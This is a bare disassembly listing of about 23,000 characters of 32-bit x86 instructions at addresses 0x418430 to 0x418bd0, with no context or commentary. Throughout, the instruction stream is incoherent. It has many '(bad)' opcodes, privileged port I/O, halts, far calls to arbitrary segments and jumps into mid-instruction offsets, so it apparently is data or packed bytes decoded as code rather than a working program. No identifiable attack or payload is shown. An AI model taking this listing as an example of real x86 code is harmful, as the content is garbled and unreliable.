  418430:	pop    edi
  418431:	scas   eax,DWORD PTR es:[edi]
  418432:	cmp    al,0x5
  418434:	jecxz  0x41847a
  418436:	pop    edi
  418437:	popa   
  418438:	dec    edi
  418439:	mov    ebp,0x7442d07b
  41843e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41843f:	mov    bl,0xb3
  418441:	in     eax,dx
  418442:	(bad)  
  418444:	mov    edi,0x82906170
  418449:	mov    dl,0x5
  41844b:	(bad)  
  41844c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41844d:	sub    BYTE PTR [esi+0x75],al
  418450:	mov    ecx,0xd85f2900
  418455:	in     eax,dx
  418456:	or     ah,bh
  418458:	dec    ebp
  418459:	xor    al,BYTE PTR [esi]
  41845b:	sbb    DWORD PTR [edx+ebp*2],esp
  41845e:	stc    
  41845f:	sbb    bl,BYTE PTR [ebx]
  418461:	jne    0x4184b3
  418463:	add    bh,ch
  418465:	out    dx,al
  418466:	jge    0x418492
  418468:	push   ds
  418469:	jno    0x4184ce
  41846b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41846c:	cdq    
  41846d:	(bad)  
  41846e:	jb     0x4184c1
  418470:	scas   eax,DWORD PTR es:[edi]
  418471:	mov    esp,0x6842fe3a
  418476:	push   eax
  418477:	scas   al,BYTE PTR es:[edi]
  418478:	push   edx
  418479:	cmp    dl,0xdd
  41847c:	xor    DWORD PTR [eax+0x5050c5ee],edi
  418482:	retf   
  418483:	xor    al,0x3
  418485:	and    al,0x46
  418487:	sub    al,0xd
  418489:	es adc al,0x3d
  41848c:	arpl   WORD PTR [ebx],ax
  41848e:	clc    
  41848f:	pop    edi
  418490:	dec    ecx
  418491:	rol    DWORD PTR [edi+edi*1+0x3a81f257],cl
  418498:	push   es
  418499:	test   eax,0x8ee78744
  41849e:	xor    esp,ecx
  4184a0:	pop    ebx
  4184a1:	xchg   ebx,eax
  4184a2:	jo     0x4184af
  4184a4:	call   0xafcc:0xe2eb9463
  4184ab:	imul   esi,DWORD PTR [ebx-0x15],0x1a
  4184af:	xchg   ebp,eax
  4184b0:	xor    BYTE PTR [edx+0xf],0x2e
  4184b4:	mov    al,ds:0x12971f1c
  4184b9:	out    0xba,al
  4184bb:	xchg   ebx,eax
  4184bc:	sbb    BYTE PTR [ebp+0x4044c5b5],0xb9
  4184c3:	or     DWORD PTR [edi],ecx
  4184c5:	xchg   esi,eax
  4184c6:	jb     0x4184f1
  4184c8:	xchg   ebp,eax
  4184c9:	loopne 0x41849a
  4184cb:	scas   eax,DWORD PTR es:[edi]
  4184cc:	fwait
  4184cd:	or     al,BYTE PTR ds:0xc71cb0fd
  4184d3:	shr    DWORD PTR [edx],0xee
  4184d6:	inc    edi
  4184d7:	inc    edx
  4184d8:	pop    esp
  4184d9:	int3   
  4184da:	cmp    dh,bl
  4184dc:	dec    esi
  4184dd:	and    BYTE PTR [ebx-0xf],0x9b
  4184e1:	test   DWORD PTR [eax-0x778113bf],edi
  4184e7:	jmp    0x4184cd
  4184e9:	sbb    bh,BYTE PTR [edi+0x6f20c0ae]
  4184ef:	mov    bl,0x8
  4184f1:	jnp    0x4184fd
  4184f3:	jnp    0x418556
  4184f5:	in     al,dx
  4184f6:	sbb    ah,BYTE PTR [esi-0x20cafb94]
  4184fc:	loope  0x41853d
  4184fe:	(bad)  
  418500:	mov    ch,0x36
  418502:	sub    ebx,DWORD PTR [ecx-0x2c]
  418505:	cmp    DWORD PTR [eax-0x4e],esp
  418508:	dec    edi
  418509:	mov    ecx,0x1cebca95
  41850e:	into   
  41850f:	loop   0x418498
  418511:	repnz hlt 
  418513:	bswap  eax
  418515:	sti    
  418516:	mov    esp,0xa1c15843
  41851b:	add    bh,al
  41851d:	dec    edx
  41851e:	ret    0x6d6b
  418521:	ins    DWORD PTR es:[edi],dx
  418522:	mov    eax,eax
  418524:	sub    al,0xb8
  418526:	sbb    esp,ebx
  418528:	inc    esi
  418529:	sub    BYTE PTR [eax],0x12
  41852c:	sub    eax,0x6445d697
  418531:	dec    esi
  418532:	ja     0x418513
  418534:	push   esi
  418535:	inc    esi
  418536:	(bad)  
  418537:	push   esp
  418538:	shl    BYTE PTR [edx+0x6653af39],cl
  41853e:	pop    ds
  41853f:	jne    0x41857f
  418541:	mov    ah,0x8b
  418543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418544:	and    DWORD PTR [ecx-0x66e1601],ebp
  41854a:	int3   
  41854b:	add    BYTE PTR ds:[esi+eax*2+0x7a],ah
  418550:	mov    bh,0x99
  418552:	xchg   esi,eax
  418553:	outs   dx,DWORD PTR ds:[esi]
  418554:	out    0x78,eax
  418556:	aaa    
  418557:	loopne 0x4185a4
  418559:	aad    0x8
  41855b:	mov    ebx,0x242d4708
  418560:	lods   al,BYTE PTR ds:[esi]
  418561:	mov    ds:0x4a3e3650,al
  418566:	push   ss
  418567:	rol    cl,cl
  418569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41856a:	sbb    esi,DWORD PTR [ebx+0x5aa8cbe]
  418570:	pop    esi
  418571:	push   0xffffffc8
  418573:	mov    edx,ecx
  418575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418576:	sub    ebp,edi
  418578:	push   0x69
  41857a:	jbe    0x4185df
  41857c:	adc    al,al
  41857e:	(bad)
  418583:	and    DWORD PTR [ecx],0xffffffa8
  418586:	xchg   esp,eax
  418587:	adc    DWORD PTR [ecx],edi
  418589:	int    0xc5
  41858b:	pop    es
  41858c:	push   ds
  41858d:	xor    eax,0x2fb7b621
  418592:	fcomp  DWORD PTR [edx-0x27]
  418595:	out    0x73,eax
  418597:	add    DWORD PTR [esi-0x13],ecx
  41859a:	sbb    ebp,DWORD PTR [edi+ecx*1]
  41859d:	scas   eax,DWORD PTR es:[edi]
  41859e:	xor    eax,0xaa78e43f
  4185a3:	cs dec ebx
  4185a5:	in     al,0xae
  4185a7:	dec    esi
  4185a8:	and    ecx,DWORD PTR [ebx]
  4185aa:	sbb    eax,0x14b4a190
  4185af:	aas    
  4185b0:	adc    DWORD PTR [edx],edi
  4185b2:	dec    ecx
  4185b3:	leave  
  4185b4:	or     ecx,edi
  4185b6:	mov    eax,ds:0x3031bd82
  4185bb:	sbb    edi,esp
  4185bd:	dec    ebx
  4185be:	or     ch,BYTE PTR [edx-0x3e]
  4185c1:	aas    
  4185c2:	cmp    BYTE PTR [edx+0xc604be8],dh
  4185c8:	dec    BYTE PTR ds:0x2bb236cd
  4185ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185cf:	inc    ebp
  4185d0:	sub    BYTE PTR [esi+0x6a],dh
  4185d3:	xlat   BYTE PTR ds:[ebx]
  4185d4:	test   eax,0xf831470f
  4185d9:	out    0x72,eax
  4185db:	xor    al,0xc5
  4185dd:	and    al,0xc3
  4185df:	jp     0x4185b4
  4185e1:	ret    
  4185e2:	pop    esp
  4185e3:	hlt    
  4185e4:	cli    
  4185e5:	cmp    bl,bh
  4185e7:	shr    BYTE PTR [ecx+0x5219101c],cl
  4185ed:	ja     0x4185a9
  4185ef:	pop    esi
  4185f0:	xchg   esi,eax
  4185f1:	lods   eax,DWORD PTR ds:[esi]
  4185f2:	sub    dh,dh
  4185f4:	pop    ebx
  4185f5:	dec    edx
  4185f6:	outs   dx,BYTE PTR ds:[esi]
  4185f7:	mov    ds:0x163c6196,eax
  4185fc:	lds    edx,FWORD PTR [edx]
  4185fe:	pop    esi
  4185ff:	add    eax,0x3e46bc43
  418604:	scas   eax,DWORD PTR es:[edi]
  418605:	bound  eax,QWORD PTR [ecx]
  418607:	mov    esi,ebx
  418609:	cmp    esi,edi
  41860b:	and    eax,0x33594dfd
  418610:	sub    bh,BYTE PTR [edi+0x1cf14012]
  418616:	dec    eax
  418617:	pop    edx
  418618:	sbb    dh,0x7
  41861b:	js     0x41863f
  41861d:	cmc    
  41861e:	add    al,0xb8
  418620:	mov    ah,0x64
  418622:	leave  
  418623:	pop    ecx
  418624:	mov    ecx,0x462bae51
  418629:	icebp  
  41862a:	ror    DWORD PTR [ebx],1
  41862c:	jbe    0x4185ef
  41862e:	mov    cs,ecx
  418630:	mov    dh,dh
  418632:	push   ss
  418633:	hlt    
  418634:	push   ecx
  418635:	test   al,0x8d
  418637:	cs aad 0xa0
  41863a:	inc    ecx
  41863b:	sbb    esp,DWORD PTR [ecx+0x568f56bd]
  418641:	xchg   ebx,eax
  418642:	into   
  418643:	out    dx,eax
  418644:	daa    
  418645:	test   DWORD PTR [ebx-0x584c9001],ecx
  41864b:	add    BYTE PTR [esi+0x430d9f09],dh
  418651:	xchg   ecx,eax
  418652:	lock sbb bl,BYTE PTR [ecx]
  418655:	xchg   ebx,eax
  418656:	push   es
  418657:	mov    ah,0x6e
  418659:	jmp    0x120c:0x135d6e31
  418660:	cs inc esp
  418662:	or     BYTE PTR [ecx-0x5f],bl
  418665:	jg     0x41865d
  418667:	fmul   DWORD PTR [ebx+0x15dc6a91]
  41866d:	pop    edx
  41866e:	sahf   
  41866f:	adc    BYTE PTR [ebx-0x1d],ah
  418672:	js     0x4186bf
  418674:	mov    al,ds:0xdb4a6de6
  418679:	jae    0x4186a2
  41867b:	hlt    
  41867c:	(bad)  
  41867d:	shl    esi,cl
  41867f:	adc    edx,DWORD PTR [ebp+0x73]
  418682:	jle    0x4186f4
  418684:	push   0x5a888612
  418689:	xor    eax,0xf0bd3dcf
  41868e:	push   cs
  41868f:	dec    ebp
  418690:	pop    edi
  418691:	lds    ebp,FWORD PTR [ecx+ebx*2]
  418694:	stos   DWORD PTR es:[edi],eax
  418695:	or     esi,DWORD PTR [ecx-0x7a]
  418698:	adc    ebx,esi
  41869a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41869c:	push   esi
  41869d:	or     eax,0x661f690b
  4186a2:	call   0x6f3a:0x2c07a8eb
  4186a9:	fwait
  4186aa:	push   cs
  4186ab:	pusha  
  4186ac:	mov    BYTE PTR [eax],al
  4186ae:	sbb    DWORD PTR [ecx-0x76],esi
  4186b1:	aad    0x6d
  4186b3:	or     eax,ecx
  4186b5:	shr    BYTE PTR [esi+0x6e],0xac
  4186b9:	xor    al,0x39
  4186bb:	js     0x4186d0
  4186bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186be:	lods   al,BYTE PTR ds:[esi]
  4186bf:	add    ch,bh
  4186c1:	dec    ebp
  4186c2:	inc    ebp
  4186c3:	outs   dx,BYTE PTR ds:[esi]
  4186c4:	xor    DWORD PTR [esi],edx
  4186c6:	ja     0x418693
  4186c8:	inc    ecx
  4186c9:	mov    al,ds:0xb27769a4
  4186ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186cf:	sub    dh,bh
  4186d1:	pop    ebp
  4186d2:	jle    0x418686
  4186d4:	fwait
  4186d5:	int    0x1c
  4186d7:	mov    BYTE PTR [edx-0x32],bh
  4186da:	xor    eax,0x3b0f988e
  4186df:	mov    fs,edx
  4186e1:	rcpps  xmm1,XMMWORD PTR [edi-0x2c62b335]
  4186e8:	or     DWORD PTR [edi-0x50d2c60b],eax
  4186ee:	bound  edi,QWORD PTR [edx]
  4186f0:	loope  0x41868e
  4186f2:	jg     0x4186b6
  4186f4:	out    dx,al
  4186f5:	push   esp
  4186f6:	sbb    eax,0x246e6f3a
  4186fb:	sub    eax,ebp
  4186fd:	mov    ds:0xc4aa3e93,eax
  418702:	or     BYTE PTR [ecx+0x4a],al
  418705:	out    dx,al
  418706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418707:	fisubr DWORD PTR [ebx-0x645303dd]
  41870d:	retf   0x3105
  418710:	dec    edi
  418711:	retf   
  418712:	not    BYTE PTR [eax+0xb3e87d0]
  418718:	nop
  418719:	xchg   ecx,eax
  41871a:	add    bh,BYTE PTR [edi-0x1725607f]
  418720:	lods   al,BYTE PTR ds:[esi]
  418721:	jg     0x4186f7
  418723:	leave  
  418724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418725:	pushf  
  418726:	or     DWORD PTR [esi+eiz*4],ecx
  418729:	sbb    DWORD PTR [esi],ebp
  41872b:	or     DWORD PTR [ebp-0x77],eax
  41872e:	cwde   
  41872f:	adc    eax,0x4d3e503a
  418734:	jmp    0x4187a4
  418736:	test   eax,0xe72c9c77
  41873b:	sub    eax,0xfb4c4eac
  418740:	push   ss
  418741:	dec    ebx
  418742:	push   esi
  418743:	aam    0x8
  418745:	sub    eax,0xb3b5164
  41874a:	mov    dl,0x14
  41874c:	mov    al,0xd4
  41874e:	test   al,0xce
  418750:	xor    eax,0x87f4a3a
  418755:	pop    ss
  418756:	pop    esi
  418757:	and    eax,0xf39d1c2a
  41875c:	imul   esi,DWORD PTR [esi+edx*4+0x62],0x2246f8e1
  418764:	gs fwait
  418766:	fwait
  418767:	cmp    al,0x61
  418769:	push   ebp
  41876a:	out    dx,al
  41876b:	xor    al,0xa4
  41876d:	inc    ecx
  41876e:	test   DWORD PTR [eax],0x4ed4fb00
  418774:	inc    ebp
  418775:	xchg   edx,eax
  418776:	sti    
  418777:	push   ebp
  418778:	mov    DWORD PTR [eax+0x2c],ecx
  41877b:	mov    DWORD PTR [edx+ebp*1],ebp
  41877e:	not    BYTE PTR [esi]
  418780:	dec    edi
  418781:	mov    ss,WORD PTR [ecx+0x48]
  418784:	pop    DWORD PTR [esp+edi*8]
  418787:	bound  ebx,QWORD PTR [esi]
  418789:	mov    cl,BYTE PTR [ebp+0x4a]
  41878c:	push   es
  41878d:	jg     0x41871d
  41878f:	and    ebx,ebp
  418791:	push   0xffffffe0
  418793:	aam    0x2e
  418795:	loopne 0x4187d2
  418797:	and    bh,BYTE PTR [ebp-0x28aea246]
  41879d:	mov    ecx,0x976296e8
  4187a2:	inc    edi
  4187a3:	sub    eax,0x347d2a38
  4187a8:	mov    dh,BYTE PTR [ecx+0x521bcd86]
  4187ae:	sti    
  4187af:	push   ss
  4187b0:	mov    esi,0x4bc47a3c
  4187b5:	iret   
  4187b6:	jp     0x418813
  4187b8:	nop
  4187b9:	cmovnp ebx,DWORD PTR [esi-0x2e]
  4187bd:	dec    ebx
  4187be:	rcr    DWORD PTR [esi+0x38da232d],0x6c
  4187c5:	ins    DWORD PTR es:[edi],dx
  4187c6:	retf   0x46bc
  4187c9:	int    0xaf
  4187cb:	test   DWORD PTR [edi-0x50],esi
  4187ce:	(bad)  
  4187cf:	mov    esi,ebx
  4187d1:	scas   al,BYTE PTR es:[edi]
  4187d2:	cmp    eax,DWORD PTR ds:0x7d4ce1c0
  4187d8:	mov    edi,0xa63fc8d7
  4187dd:	or     ebx,ecx
  4187df:	int3   
  4187e0:	icebp  
  4187e1:	scas   al,BYTE PTR es:[edi]
  4187e2:	xchg   BYTE PTR [esi+0x773f9efc],bl
  4187e8:	shl    al,0x82
  4187eb:	or     cl,BYTE PTR [ebx+eiz*1]
  4187ee:	pop    edx
  4187ef:	pop    es
  4187f0:	retf   
  4187f1:	out    dx,eax
  4187f2:	jl     0x41883c
  4187f4:	mov    ecx,0x619559b4
  4187f9:	and    BYTE PTR [eax-0x6],cl
  4187fc:	jg     0x41884a
  4187fe:	jle    0x418870
  418800:	push   ds
  418801:	and    bh,dh
  418803:	test   DWORD PTR [ebp-0x36],ecx
  418806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418807:	rol    DWORD PTR [eax+0x356cf6a0],0x6d
  41880e:	xor    ebp,DWORD PTR [edx-0x2d]
  418811:	xor    cl,bh
  418813:	dec    ebx
  418814:	ss clc 
  418816:	loope  0x41881a
  418818:	inc    edx
  418819:	mov    ch,0x65
  41881b:	pop    es
  41881c:	jns    0x418856
  41881e:	gs push esp
  418820:	add    eax,0xf1c1e7ae
  418825:	(bad)  
  418826:	rcr    esi,0xae
  418829:	rcl    DWORD PTR [edi-0xf],cl
  41882c:	inc    edi
  41882d:	xor    DWORD PTR [ecx-0x7f],esi
  418830:	jg     0x4187dd
  418832:	mov    ebp,0xee43f26f
  418837:	inc    ebp
  418838:	mov    ds:0x42064e74,al
  41883d:	test   DWORD PTR [ebx],edi
  41883f:	mov    bh,0xe7
  418841:	loop   0x4187dd
  418843:	lahf   
  418844:	popf   
  418845:	inc    edx
  418846:	mov    dl,0x7
  418848:	outs   dx,DWORD PTR ds:[esi]
  418849:	call   0x64f5:0x7f589c34
  418850:	aam    0xef
  418852:	retf   0x1277
  418855:	dec    esp
  418856:	push   0x67
  418858:	aas    
  418859:	outs   dx,BYTE PTR ds:[esi]
  41885a:	shl    DWORD PTR [edi+0x497c5de5],cl
  418860:	lea    ebp,[ebp+0x1f1fbd5e]
  418866:	std    
  418867:	ret    0x6928
  41886a:	add    DWORD PTR [eax+0x3e],esi
  41886d:	jge    0x418862
  41886f:	sahf   
  418870:	repz in eax,0x1f
  418873:	gs mov ecx,0x6f5460ad
  418879:	inc    ecx
  41887a:	or     DWORD PTR [ebx],0xffffff81
  41887d:	jle    0x4188bd
  41887f:	mov    esi,0xf1d2dd56
  418884:	and    eax,0xeb8e41b3
  418889:	(bad)  
  41888a:	popa   
  41888b:	repz loopne 0x418898
  41888e:	in     al,0xef
  418890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418891:	test   BYTE PTR [ecx-0x43],ch
  418894:	or     ah,BYTE PTR [ebp-0x7afbf69a]
  41889a:	pop    ebx
  41889b:	hlt    
  41889c:	fincstp 
  41889e:	ja     0x418913
  4188a0:	es cli 
  4188a2:	mov    ds:0x3e1d67d0,al
  4188a7:	outs   dx,DWORD PTR ds:[esi]
  4188a8:	add    cl,BYTE PTR [edx+0x6ec5100e]
  4188ae:	mov    cl,0x86
  4188b0:	jb     0x4188db
  4188b2:	stc    
  4188b3:	inc    esp
  4188b4:	and    eax,0x71fd4244
  4188b9:	add    dl,al
  4188bb:	pop    ebx
  4188bc:	sbb    DWORD PTR [esi],ebp
  4188be:	out    0xec,al
  4188c0:	jmp    0x5adc:0xc8a7034c
  4188c7:	sub    al,0xb0
  4188c9:	push   edi
  4188ca:	adc    eax,0x7890b066
  4188cf:	sbb    eax,0x5e6196c3
  4188d4:	shl    BYTE PTR [ecx],cl
  4188d6:	mov    dl,0x6e
  4188d8:	int3   
  4188d9:	loope  0x4188cc
  4188db:	or     eax,0xdfb90a5e
  4188e0:	rcl    eax,cl
  4188e2:	cld    
  4188e3:	test   DWORD PTR [edx+esi*8-0x77],ecx
  4188e7:	jmp    0x68a7:0x9463340b
  4188ee:	leave  
  4188ef:	adc    DWORD PTR ds:0x36edfd59,edx
  4188f5:	lock push ds
  4188f7:	inc    ebx
  4188f8:	dec    esp
  4188f9:	sbb    WORD PTR [eax-0x4f],dx
  4188fd:	cdq    
  4188fe:	out    0xac,al
  418900:	or     DWORD PTR [edi],edx
  418902:	sbb    eax,0x5954477a
  418907:	fimul  WORD PTR [edx+0x700b4998]
  41890d:	test   DWORD PTR [edx+0x18],edi
  418910:	xor    BYTE PTR [edi+edx*4-0x50c8d8a5],bh
  418917:	pop    edx
  418918:	jnp    0x41896e
  41891a:	sub    dh,BYTE PTR ss:[edx-0x6e05ce0e]
  418921:	hlt    
  418922:	hlt    
  418923:	aad    0x32
  418925:	sbb    eax,0x163779ba
  41892a:	pusha  
  41892b:	ret    
  41892c:	mov    ?,WORD PTR [ebp+0x29]
  41892f:	push   esp
  418930:	jl     0x41892f
  418932:	shr    DWORD PTR [ebx-0x10],0x79
  418936:	dec    eax
  418937:	push   edx
  418938:	mov    eax,0xcce5f379
  41893d:	out    0x40,eax
  41893f:	test   ch,ah
  418941:	(bad)  
  418942:	mov    ebp,0xc3bc315b
  418947:	jge    0x418933
  418949:	cmp    cl,BYTE PTR [ecx-0x77f83924]
  41894f:	imul   ebx,DWORD PTR [ebx-0x3f],0xffffffb2
  418953:	xchg   BYTE PTR [ecx-0xabb5268],dh
  418959:	(bad)  
  41895a:	mov    dl,0x39
  41895c:	dec    edi
  41895d:	clc    
  41895e:	inc    ebx
  41895f:	add    bl,BYTE PTR [eax-0x4b]
  418962:	sub    DWORD PTR [ecx-0x44],eax
  418965:	mov    esi,0xf189e62
  41896a:	dec    esp
  41896b:	clc    
  41896c:	dec    ebp
  41896d:	fisttp DWORD PTR [eax-0x388facb1]
  418973:	pop    eax
  418974:	aas    
  418975:	cmp    al,0x35
  418977:	inc    ebx
  418978:	test   DWORD PTR [ecx+eiz*1+0x2eb9da5],esi
  41897f:	cwde   
  418980:	lods   eax,DWORD PTR ds:[esi]
  418981:	mov    ebp,0x529fdbfd
  418986:	call   0xc45e:0xe1153402
  41898d:	fnsave [edi+0x0]
  418990:	jno    0x4189a6
  418992:	adc    esi,DWORD PTR [ebp+0x4]
  418995:	call   0x8b9d:0x70a0ba89
  41899c:	xchg   eax,esi
  41899e:	push   0xc055f506
  4189a3:	mov    ds:0xa2c35311,eax
  4189a8:	pop    esi
  4189a9:	int    0x32
  4189ab:	xchg   BYTE PTR [ebx+0x5de9221b],al
  4189b1:	inc    DWORD PTR [esi-0x5f]
  4189b4:	mov    dh,0xd
  4189b6:	enter  0x72e5,0x6f
  4189ba:	scas   eax,DWORD PTR es:[edi]
  4189bb:	outs   dx,BYTE PTR ds:[esi]
  4189bc:	test   DWORD PTR [ecx-0x1c545336],0x41394fff
  4189c6:	(bad)  
  4189c7:	jle    0x4189a2
  4189c9:	jns    0x418a2e
  4189cb:	dec    ecx
  4189cc:	push   ebx
  4189cd:	jno    0x4189c0
  4189cf:	sbb    DWORD PTR [edi-0x43],ebx
  4189d2:	push   edx
  4189d3:	(bad)  
  4189d4:	jg     0x418a22
  4189d6:	mov    bh,0x3c
  4189d8:	loopne 0x4189d1
  4189da:	cmp    ebp,edi
  4189dc:	imul   edx,DWORD PTR [ecx-0x2e4945f],0x22c6a32e
  4189e6:	add    ch,BYTE PTR fs:[ebp-0x637a918c]
  4189ed:	aad    0xcc
  4189ef:	loopne 0x41898c
  4189f1:	aam    0x75
  4189f3:	sbb    eax,0x7f436d54
  4189f8:	cmp    dh,BYTE PTR [edi-0x334d3ea5]
  4189fe:	push   es
  4189ff:	cmp    eax,0xabc01d8c
  418a04:	mov    ah,0xd
  418a06:	int3   
  418a07:	inc    BYTE PTR [esi]
  418a09:	data16 rcl BYTE PTR [edi-0x4191f818],1
  418a10:	or     ah,BYTE PTR [ecx+0x65]
  418a13:	or     BYTE PTR [edx-0xc],dl
  418a16:	xor    edx,ebx
  418a18:	mov    cl,0xb7
  418a1a:	and    dl,BYTE PTR [ecx]
  418a1c:	dec    ebx
  418a1d:	mov    ah,dh
  418a1f:	out    dx,al
  418a20:	(bad)  
  418a22:	adc    BYTE PTR cs:[edx+0x3d8ba156],dh
  418a29:	inc    ecx
  418a2a:	inc    edi
  418a2b:	outs   dx,BYTE PTR ds:[esi]
  418a2c:	add    esp,DWORD PTR [ebp-0x28]
  418a2f:	(bad)
  418a33:	retf   0xbceb
  418a36:	aam    0x42
  418a38:	idiv   BYTE PTR [eax+0x6eda9c5b]
  418a3e:	fwait
  418a3f:	bound  esi,QWORD PTR [ebp+0x18d28199]
  418a45:	stos   DWORD PTR es:[edi],eax
  418a46:	aam    0x11
  418a48:	enter  0x4724,0x14
  418a4c:	xor    al,0xb7
  418a4e:	je     0x418a20
  418a50:	xchg   BYTE PTR [ebx+0x77],dh
  418a53:	inc    esp
  418a54:	pop    ecx
  418a55:	lea    esp,[edx+0x7a]
  418a58:	cmp    eax,0xdafaaa21
  418a5d:	sub    DWORD PTR ds:0x437442c8,ebp
  418a63:	mov    ds:0x81c1b880,al
  418a68:	ins    DWORD PTR es:[edi],dx
  418a69:	mov    al,0xa
  418a6b:	jnp    0x418ac9
  418a6d:	fld    DWORD PTR [edi-0x46]
  418a70:	lods   eax,DWORD PTR ds:[esi]
  418a71:	inc    esi
  418a72:	repz push 0x46
  418a75:	fist   DWORD PTR [edx]
  418a77:	int    0x6b
  418a79:	jle    0x418a8e
  418a7b:	xchg   ebp,eax
  418a7c:	imul   ecx,esp,0xffffffcd
  418a7f:	sub    DWORD PTR [ebp-0x6d],ebp
  418a82:	out    0x25,al
  418a84:	and    al,dh
  418a86:	(bad)  
  418a87:	pop    ss
  418a88:	sar    DWORD PTR [eax+0x20],cl
  418a8b:	adc    esp,ebp
  418a8d:	outs   dx,BYTE PTR ds:[esi]
  418a8e:	neg    DWORD PTR [ecx-0x38]
  418a91:	(bad)  
  418a92:	imul   eax,DWORD PTR [edi],0xffffffbb
  418a95:	repnz gs cmp edx,eax
  418a99:	test   BYTE PTR [esi],dl
  418a9b:	push   esp
  418a9c:	mov    ecx,0xf1ca076b
  418aa1:	int3   
  418aa2:	xor    ebp,DWORD PTR [ecx]
  418aa4:	jae    0x418a65
  418aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aa7:	xchg   ebx,eax
  418aa8:	and    cl,0x57
  418aab:	int    0xea
  418aad:	adc    al,0xa7
  418aaf:	adc    al,0xc7
  418ab1:	xchg   ecx,eax
  418ab2:	scas   eax,DWORD PTR es:[edi]
  418ab3:	or     DWORD PTR [ebp-0x4cedb20f],ebp
  418ab9:	fisttp WORD PTR [edx+0x34]
  418abc:	(bad)  
  418abd:	mov    eax,0x14f064d8
  418ac2:	xchg   edi,eax
  418ac3:	das    
  418ac4:	daa    
  418ac5:	pop    ebx
  418ac6:	push   es
  418ac7:	sti    
  418ac8:	fs inc eax
  418aca:	pop    eax
  418acb:	xchg   DWORD PTR [edx],esi
  418acd:	mov    ecx,edx
  418acf:	jns    0x418a65
  418ad1:	mov    cl,0x48
  418ad3:	mov    al,ds:0x3773ed96
  418ad8:	int3   
  418ad9:	dec    edx
  418ada:	dec    eax
  418adb:	mov    WORD PTR [esi+ebx*1-0x47],fs
  418adf:	ins    BYTE PTR es:[edi],dx
  418ae0:	rcl    ebx,cl
  418ae2:	mov    bh,0xf1
  418ae4:	sbb    bh,BYTE PTR [edi-0x4c]
  418ae7:	clc    
  418ae8:	push   ebp
  418ae9:	add    eax,DWORD PTR [ebx-0x3d699f3f]
  418aef:	mov    ch,0x99
  418af1:	ret    0xe346
  418af4:	mov    esp,0xb21d62c3
  418af9:	inc    ebx
  418afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418afb:	and    cl,al
  418afd:	loopne 0x418b22
  418aff:	adc    esi,DWORD PTR [ebp-0x4e6db81b]
  418b05:	fnstsw WORD PTR [ecx]
  418b07:	sub    DWORD PTR [eax-0x45],esi
  418b0a:	add    DWORD PTR [eax],0xfed3f664
  418b10:	in     al,0x1d
  418b12:	iret   
  418b13:	fsubr  QWORD PTR [eax+0x5753add0]
  418b19:	push   0xb0cc03e2
  418b1e:	fs sub eax,0x91321787
  418b24:	and    eax,0x338f6047
  418b29:	or     al,0x42
  418b2b:	push   cs
  418b2c:	xlat   BYTE PTR ds:[ebx]
  418b2d:	sbb    al,0xe4
  418b2f:	loopne 0x418b7b
  418b31:	fdivp  st(5),st
  418b33:	retf   
  418b34:	aaa    
  418b35:	push   ebx
  418b36:	and    BYTE PTR [eax-0x1],dl
  418b39:	pop    edi
  418b3a:	jp     0x418b35
  418b3c:	jbe    0x418b9f
  418b3e:	fs icebp 
  418b40:	or     al,0x6f
  418b42:	jecxz  0x418b89
  418b44:	arpl   WORD PTR ds:0x27193e00,dx
  418b4a:	xchg   edi,eax
  418b4b:	inc    esi
  418b4c:	ins    DWORD PTR es:[edi],dx
  418b4d:	into   
  418b4e:	shl    ch,cl
  418b50:	xor    al,ch
  418b52:	xor    al,0x8e
  418b54:	mov    ebp,0x8d53a5b8
  418b59:	les    esi,FWORD PTR [esi+0xf]
  418b5c:	jns    0x418b59
  418b5e:	inc    ebx
  418b5f:	xchg   ebx,eax
  418b60:	mov    dh,0x54
  418b62:	int3   
  418b63:	bound  esi,QWORD PTR [ecx]
  418b65:	(bad)  
  418b66:	aam    0xc4
  418b68:	xor    DWORD PTR [ebp-0x77],esi
  418b6b:	xor    al,0x65
  418b6d:	pop    edi
  418b6e:	add    al,0x72
  418b70:	sub    al,0x62
  418b72:	outs   dx,DWORD PTR ds:[esi]
  418b73:	pop    ebp
  418b74:	xor    bh,BYTE PTR [ebx-0x72]
  418b77:	jmp    0xbfe0:0xfdafa936
  418b7e:	in     al,dx
  418b7f:	inc    edi
  418b80:	mov    ds:0xfc41662a,al
  418b85:	enter  0x9fe3,0x3
  418b89:	test   BYTE PTR [edx+0x1d6ee16b],dh
  418b8f:	scas   al,BYTE PTR es:[edi]
  418b90:	sbb    BYTE PTR [edi],dl
  418b92:	ret    
  418b93:	pop    edi
  418b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b95:	inc    edx
  418b96:	sbb    eax,0x42082f59
  418b9b:	mov    ds:0x61cd68af,al
  418ba0:	in     al,0xbc
  418ba2:	outs   dx,BYTE PTR ds:[esi]
  418ba3:	test   al,0x96
  418ba5:	out    dx,al
  418ba6:	aad    0x18
  418ba8:	dec    ebp
  418ba9:	aaa    
  418baa:	mov    ds:0xa90a047a,eax
  418baf:	repnz cmc 
  418bb1:	ins    DWORD PTR es:[edi],dx
  418bb2:	icebp  
  418bb3:	mov    eax,0xa5a6a25a
  418bb8:	pop    esi
  418bb9:	icebp  
  418bba:	mov    cl,0x34
  418bbc:	pop    ss
  418bbd:	xor    BYTE PTR [eax],bl
  418bbf:	jae    0x418b98
  418bc1:	(bad)  
  418bc2:	mov    ah,0x49
  418bc4:	aaa    
  418bc5:	call   0x6c50f105
  418bca:	idiv   DWORD PTR [ecx-0x66]
  418bcd:	mov    ebx,ebp
  418bcf:	push   eax
  418bd0:	mov    ds:0x607a75e,eax
